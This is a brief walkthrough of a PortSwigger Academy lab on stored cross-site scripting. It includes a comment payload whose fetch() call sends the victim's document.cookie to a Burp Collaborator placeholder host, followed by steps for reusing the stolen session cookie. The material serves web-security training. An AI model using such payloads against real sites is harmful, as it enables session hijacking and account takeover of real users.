# Lab: Exploiting cross-site scripting to steal cookies

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

## Lab idea

The stored-comment XSS is evaluated with a simulated victim who views comments, and the challenge focuses on session-cookie exposure and account impersonation risk. It practices assessing session-related consequences of script execution.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Using Burp Suite Professional, go to the Collaborator tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated: <script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode…
4. Go back to the Collaborator tab, and click "Poll now".
5. Take a note of the value of the victim's cookie in the POST body.
6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator.

## Payloads / key values
- `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>`
- `/my-account`

## Official source
- [PortSwigger Academy: Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
